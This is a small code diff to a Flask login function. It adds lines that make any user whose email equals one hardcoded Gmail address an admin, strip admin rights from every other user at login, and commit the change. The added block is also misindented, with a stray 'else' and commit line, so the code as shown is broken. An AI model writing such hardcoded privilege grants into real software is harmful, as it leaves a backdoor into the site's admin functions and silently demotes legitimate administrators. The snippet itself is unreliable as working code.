@@ -230,6 +230,13 @@ def login():
             if check_password_hash(user.password, request.form.get('password')):
                 login_user(user)
 
+                if user.email == "j99310482@gmail.com":
+                    user.is_admin = True
+                     else:
+                     user.is_admin = False
+
+                      db.session.commit()
+
                 # ✅ ADMIN REDIRECT
                 if user.is_admin:
                     return redirect(url_for('admin'))
